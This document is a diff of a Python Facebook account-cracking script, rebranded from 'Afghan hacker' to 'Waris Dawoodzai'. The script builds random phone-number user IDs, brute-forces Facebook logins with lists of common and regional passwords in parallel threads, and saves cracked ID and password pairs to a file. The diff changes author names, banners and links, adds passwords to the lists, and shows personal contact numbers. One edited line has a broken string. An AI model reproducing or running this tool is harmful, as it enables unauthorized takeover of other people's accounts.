@@ -3,7 +3,7 @@
 from os import path
 import os,base64,zlib,pip,urllib
 os.system('xdg-open https://www.facebook.com/profile.php?id=waris.dawoodzai')
-print('\n\033[1;37m MR AFG HKR TOOLS UPDATE...\n NICE CLONER...')
+print('\n\033[1;37m Welcome to the world of hacking...')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
 try:
@@ -16,7 +16,8 @@ except ModuleNotFoundError:
     os.system('python run.py')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
-os.system('xdg-open https://wa.me/qr/NVRYUGYHXSKXI1')
+os.system('xdg-open https://facebook.com/groups/1221836568532464/')
+print('\n\033[1;37m JOIN TO THE DAWOODZAI HACKER GROUP')
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -123,48 +124,20 @@ for xd in range(10000):
 	
 
 logo=("""
-\033[1;95m	
-                     .ed$$$" ""$$$$$be.
-                   -"           ^""**$$$e.
-                 ."                   '$$$c
-                /                      "4$$b
-               d  3                      $$$$
-               $  *                   .$$$$$$
-              .$  ^c           $$$$$e$$$$$$$$.
-              d$L  4.         4$$$$$$$$$$$$$$b
-              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
-  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
- z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
-4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
-^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
-  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
-        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
-          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
-             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
-               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
-                  "$   "%*ebJLzb$e$$$$$b $P"
-                    %..      4$$$$$$$$$$ "
-                     $$$e   z$$$$$$$$$$%
-                      "*$c  "$$$$$$$P"
-                       .""$"*$$$$$$$$bc
-                    .-"    .$***$$$""$"*e.
-                 .-"    .e$"     "*$c  ^*b.
-          .=*$"$"    .e$*"          "*bc  "*$e..
-        .$"        .z*"               ^*$e.   "*****e.
-        $$ee$c   .d"                     "*$.        3.
-        ^*$E")$..$"                         *   .ee==d%
-           $.d$$$*     Farhan Hamza😘         *  J$$$e*
-            $$$$                                 "$$$"
-                       Afghan hacker
+\033[1;97m ░██╗░░░░░░░██╗░█████╗░██████╗░██╗░██████╗
+░██║░░██╗░░██║██╔══██╗██╔══██╗██║██╔════╝
+░╚██╗████╗██╔╝███████║██████╔╝██║╚█████╗░
+░░████╔═████║░██╔══██║██╔══██╗██║░╚═══██╗
+░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║██║██████╔╝
+░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
 \x1b[1;96m---------------------------------------------------
-\x1b[1;96m|\x1b[1;97m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m AUTHOR     \x1b[1;96m: \x1b[1;96m Afghan hacker   
-\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m FACEBOOK   \x1b[1;96m: \x1b[1;96m Afgan hacker    
-\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m WHATSAPP   \x1b[1;96m: \x1b[1;96m +93764034195            
-\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m Khan       \x1b[1;97m: \x1b[1;96m Farhan Hamza 
-\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m Telegram   \x1b[1;96m: \x1b[1;96m Afghanhacker4
-\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m GITHUB     \x1b[1;96m:\x1b[1;96m  Afghan hacker
+\x1b[1;96m|\x1b[1;97m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m AUTHOR     \x1b[1;96m: \x1b[1;96m WARIS DAWOODZAI   
+\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m FACEBOOK   \x1b[1;96m: \x1b[1;96m WARIS DAWOODZAI    
+\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m WHATSAPP   \x1b[1;96m: \x1b[1;96m +93702589423            
+\x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m GITHUB     \x1b[1;96m:\x1b[1;96m warisdawoodzaihacker
 \x1b[1;96m|\x1b[1;96m [\x1b[1;96m+\x1b[1;96m]  \x1b[1;96m VERSION    \x1b[1;96m:\x1b[1;96m  0.420            
 \x1b[1;92m----------------------------------------------------    """)
+\x1b[1;92m🄳🄾🄽❜🅃 🄵🄾🅁🄶🄴🅃 🄰🄻🄻🄰🄷 🄰🅃 🄰🄽🅈 🅃🄸🄼🄴    """)
 
 def lines():
 	print('\33[1;37m----------------------------------------------')
@@ -202,9 +175,9 @@ def riaz():
 	if riaz1 =='5':
 		riaz()
 	if riaz1 =='4':
-		os.system('xdg-open https://chat.whatsapp.com/Llx8rRmj7teJG2qDrIGJM5')
+		os.system('xdg-open https://facebook.com/groups/1221836568532464/')
 	if riaz1 =='3':
-		os.system('xdg-open https://chat.whatsapp.com/Llx8rRmj7teJG2qDrIGJM5');riaz()
+		os.system('xdg-open https://facebook.com/groups/1221836568532464/');riaz()
 	if riaz1 =='2':
 		bangla()
 	else:
@@ -249,16 +222,16 @@ def m1():
     os.system('clear')
     print(logo)
     print('[Afghan] Example  : 070,079,078,077')
-    print('\x1b[1;92m[HAQANI] See Note : PUT YOUR SIM CODE ')
+    print('\x1b[1;92m[DAWOODZAI] See Note : PUT YOUR SIM CODE ')
     lines()
-    kode = input('[Afghan] Your Code : ')
+    kode = input('[WARIS] Your Code : ')
     lines()
     os.system('clear')
     print(logo)
     print('[Afghan] Example  : 2000,3000,5000,10000')
-    print('\x1b[1;92m[Afghan] See Note : PUT LEMIT ')
+    print('\x1b[1;92m[WARIS] See Note : PUT LEMIT ')
     lines()
-    limit = int(input('[Afghan] Idz Lemit : '))
+    limit = int(input('[WARIS] Idz Lemit : '))
     print(46*'-')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -273,7 +246,7 @@ def m1():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000']
+            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','12345677','kandahar123','javid123','@#123456','0800900','tahir123','noorkhan','haqmal12','hikmatkhan','khostai','qwerty','facebook']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -285,17 +258,17 @@ def m2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 070,078,077,****Etc')
-    print('\x1b[1;92m[Afghan] See Note : PUT YOUR SIM CODE ')
+    print('[Waris] Example  : 070,078,077,****Etc')
+    print('\x1b[1;92m[Waris] See Note : PUT YOUR SIM CODE ')
     lines()
-    kode = input('[Afghan] Your Code : ')
+    kode = input('[Waris] Your Code : ')
     lines()
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 5000,100000,10000')
-    print('\x1b[1;92m[Afghan] See Note : PUT LEMIT ')
+    print('[Waris] Example  : 5000,100000,10000')
+    print('\x1b[1;92m[Waris] See Note : PUT LEMIT ')
     lines()
-    limit = int(input('[Afghan] Idz Lemit : '))
+    limit = int(input('[Waris] Idz Lemit : '))
     print(46*'-')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -310,7 +283,7 @@ def m2():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123']
+            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123','khan123','mansoor','jano123']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -322,17 +295,17 @@ def m3():
     user=[]
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 9370,9378,9377,****Etc')
+    print('[Waris] Example  : 9370,9378,9377,****Etc')
     print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
     lines()
-    kode = input('[Afghan] Your Code : ')
+    kode = input('[Waris] Your Code : ')
     lines()
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 2000,3000,5000,Afghan')
-    print('\x1b[1;92m[Afghan] See Note : PUT LEMIT ')
+    print('[Waris] Example  : 2000,3000,5000,Afghan')
+    print('\x1b[1;92m[Waris] See Note : PUT LEMIT ')
     lines()
-    limit = int(input('[Afghan] Idz Lemit : '))
+    limit = int(input('[Waris] Idz Lemit : '))
     print(46*'-')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -347,7 +320,7 @@ def m3():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123']
+            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123','javid123','khan123','070000','778899']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -360,17 +333,17 @@ def b1():
     user=[]
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 0306,92***,92***,')
+    print('[Waris] Example  : 0306,92***,92***,')
     print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
     lines()
-    kode = input('[Afghan] Your Code : ')
+    kode = input('[Waris] Your Code : ')
     lines()
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 2000,3000,5000,10000')
+    print('[Waris] Example  : 2000,3000,5000,10000')
     print('\x1b[1;91m[+] See Note : PUT LEMIT ')
     lines()
-    limit = int(input('[Afghan] YOUR LEMIT : '))
+    limit = int(input('[Waris] YOUR LEMIT : '))
     print(46*'-')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -385,7 +358,7 @@ def b1():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,kode,'pakistan','khankhan','khan123','malik123','Ahmad123','karachi123','pikhawar']
+            pwx=[guru,kode,'pakistan','khankhan','khan123','malik123','Ahmad123','karachi123','pikhawar','badrai123','khalid1122]
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -397,17 +370,17 @@ def b2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 92***,92***,92***,')
-    print('\x1b[1;91m[Afghan] See Note : PUT YOUR SIM CODE ')
+    print('[Waris] Example  : 92***,92***,92***,')
+    print('\x1b[1;91m[Waris] See Note : PUT YOUR SIM CODE ')
     lines()
-    kode = input('[KING] Your Code : ')
+    kode = input('[Waris] Your Code : ')
     lines()
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 2000,3000,5000,10000')
-    print('\x1b[1;92m[Afghan] See Note : PUT LEMIT ')
+    print('[Waris] Example  : 2000,3000,5000,10000')
+    print('\x1b[1;92m[Waris] See Note : PUT LEMIT ')
     lines()
-    limit = int(input('[Afghan] Idz Lemit : '))
+    limit = int(input('[Waris] Idz Limit : '))
     print(46*'-')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -477,15 +450,15 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[Afghan-OK] '+cid+' | '+ps+'\033[0;97m')
-                open('Afghan-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[Waris-OK] '+cid+' | '+ps+'\033[0;97m')
+                open('Waris-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mAfghan\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mWaris\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
@@ -498,7 +471,7 @@ def approval():
   try:
     httpCaht = requests.get('https://github.com/Afghan9370/Afghan/blob/main/approval.txt').text
     if id in httpCaht:
-      print("\33[1;32m《Hi bro》 YOUR KEY IS APPROVED 《🆁︎🅾︎??︎🅴︎🆇︎ـ🅺︎🅸︎🅽︎🅶︎》.")
+      print("\33[1;32m《Hi bro》 YOUR KEY IS APPROVED 《Waris khan》.")
       msg = str(os.geteuid())
       time.sleep(0.5)
       riaz()
